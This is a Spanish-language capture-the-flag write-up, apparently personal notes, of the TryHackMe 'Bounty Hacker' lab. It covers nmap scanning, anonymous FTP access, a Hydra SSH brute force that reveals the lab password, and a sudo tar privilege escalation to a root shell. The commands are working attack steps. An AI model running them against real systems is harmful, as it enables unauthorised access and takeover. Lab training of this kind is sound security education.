---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - Linux
  - HTTP
  - FuzzingWeb
  - FTP
  - Hydra
  - SSH
  - PrivilegeEscalation
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#FTP|FTP]]
	- [[#Explotación#Hydra|Hydra]]
	- [[#Explotación#SSH|SSH]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]

---
# Resolviendo la máquina Bounty Hacker

>En esta publicación, comparto cómo resolví la máquina **Bounty Hacker** de [TryHackMe](https://tryhackme.com/room/cowboyhacker).

---
## Enumeración
### Ping

`ping -c 1 10.10.230.224`

![[Pasted image 20250801094639.png]]

*TTL=63* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.230.224 -oG allPorts`

![[Pasted image 20250801094719.png]]

`nmap -p21,22,80 -sCV 10.10.230.224 -oN targeted`

![[Pasted image 20250801094741.png]]
### HTTP

`http://10.10.230.224/`

![[Pasted image 20250801102946.png]]
#### Fuzzing Web

`dirb http://10.10.230.224/`

![[Pasted image 20250801103039.png]]

---
## Explotación
### FTP

Se observa en la enumeración que el protocolo **FTP** se encuentra abierto en el puerto 21 con el inicio de sesión anónimo.

`ftp anonymous@10.10.230.224`

![[Pasted image 20250801103238.png]]

Se descargan los archivos y se visualizan.

`get locks.txt`

`cat locks.txt`

![[Pasted image 20250801103347.png]]

`get task.txt`

`cat task.txt`

![[Pasted image 20250801103432.png]]

Se identifica al usuario `lin` y se encuentra una lista de contraseñas en el archivo `locks.txt`.

Se procede a realizar fuerza bruta con **Hydra** al servicio **SSH** con el usuario y contraseña encontrados.
### Hydra

`hydra -l lin -P locks.txt ssh://10.10.230.224`

![[Pasted image 20250801103610.png]]

Se encuentra la contraseña de `lin`: `RedDr4gonSynd1cat3`.

Se accede al servicio **SSH** (puerto 22) con las credenciales obtenidas.
### SSH

`ssh lin@10.10.230.224`

![[Pasted image 20250801103755.png]]
### Escalada de Privilegios
#### Sudo

`sudo -l`

![[Pasted image 20250801103910.png]]

Se detecta que el binario `/bin/tar` puede ejecutarse con permisos sudo, se busca en [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo).

![[Pasted image 20250801104022.png]]

`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

![[Pasted image 20250801104046.png]]

---